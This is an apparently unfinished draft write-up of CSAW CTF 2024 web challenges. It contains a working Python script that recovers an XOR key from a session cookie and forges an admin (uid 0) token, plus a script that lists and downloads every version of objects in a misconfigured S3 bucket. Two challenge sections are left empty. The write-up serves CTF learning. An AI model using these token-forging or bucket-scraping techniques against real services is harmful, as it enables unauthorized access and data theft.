+++ 
draft = true
date = 2024-09-10T21:04:14+09:00
title = "CSAW CTF 2024 Quals Writeup"
description = ""
slug = "csaw-ctf-2024-quals-writeup"
authors = []
tags = ["CTF", "web", "steganography", "English"]
categories = []
externalLink = ""
series = []
+++

## Intro

I played CSAW CTF 2024 Quals with team Jejupork, and solved all web challs. Here's the writeup for [log me in]({{< ref "#log-me-in-web" >}}), [bucketwars]({{< ref "#bucketwars-web" >}}), [charlies angels]({{< ref "#charlies-angels-web" >}}) and [lost pyramid]({{< ref "#lost-pyramid-web" >}}).

## log me in (web)

Log me in was a simple flask application challenge with user registeration and login feature in it. The app will give flag if user's uid is 0(admin), but new user will always be registered as uid 1(user). 

After authentication, the app makes a token using custom encoding/decoding method to share. The encoding / decoding code is here.

```python
# Some cryptographic utilities
def encode(status: dict) -> str:
    try:
        plaintext = json.dumps(status).encode()
        out = b''
        for i,j in zip(plaintext, os.environ['ENCRYPT_KEY'].encode()):
            out += bytes([i^j])
        return bytes.hex(out)
    except Exception as s:
        LOG(s)
        return None

def decode(inp: str) -> dict:
    try:
        token = bytes.fromhex(inp)
        out = ''
        for i,j in zip(token, os.environ['ENCRYPT_KEY'].encode()):
            out += chr(i ^ j)
        user = json.loads(out)
        return user
    except Exception as s:
        LOG(s)
        return None
```

We can easily find out that `os.environ['ENCRYPT_KEY']` can be leaked by xoring  authentication token with json serialized user object. Thus, we can make arbitrary user object and elevate out uid to admin.

* Code
```python
import requests
import json

# URL = 'http://localhost:9996'
URL = 'https://logmein1.ctf.csaw.io'

def encode_json(username, displayname, uid):
    data = {
        'username': username,
        'displays': displayname,
        'uid': uid
    }
    return json.dumps(dict(data)).encode()

r = requests.post(URL + '/register', data={
    'username': 'somelongusername',
    'password': 'somelongpassword',
    'displayname': 'somelongdisplayname'
})

r = requests.post(URL + '/login', data={
    'username': 'somelongusername',
    'password': 'somelongpassword'
})

session = r.cookies['info']

session = bytes.fromhex(session)

message = encode_json('somelongusername', 'somelongdisplayname', 1)

key = b''

for i in range(len(message)):
    key += bytes([session[i] ^ message[i]])

message_to_change = encode_json('somelongusername', 'somelongdisplayname', 0)
new_session = b''
for i in range(len(message_to_change)):
    new_session += bytes([key[i] ^ message_to_change[i]])

r = requests.get(URL + '/user', cookies={'info': new_session.hex()})
print(r.text)
```

## bucketwars (web)

The callenge gave me only one link which lead to a static site. After some investigation, I found out that this site was served from AWS S3 bucket, and it seems that I should abuse malconfigured bucket policy to get more information. On the site there was a hint about bucket object versions, so I used `list_object_versions` api to crawl every version of objects.

```python
import boto3
import jq
import json
import os.path

s3 = boto3.client('s3')
bucket_name = 'bucketwars.ctf.csaw.io'

response = s3.list_object_versions(Bucket=bucket_name)

response = json.loads(json.dumps(response, default=str))
files = jq.compile('.Versions[]|{Key: .Key,VersionId: .VersionId}').input(response).all()

for file in files:
    print(file)
    response = s3.get_object(Bucket=bucket_name, Key=file['Key'], VersionId=file['VersionId'])
    filename, fileext = os.path.splitext(file['Key'])
    with open('files/' + filename + '_' + file['VersionId'] + fileext, 'wb') as f:
        f.write(response['Body'].read())
```



## charlies angels (web)

## lost pyramid (web)

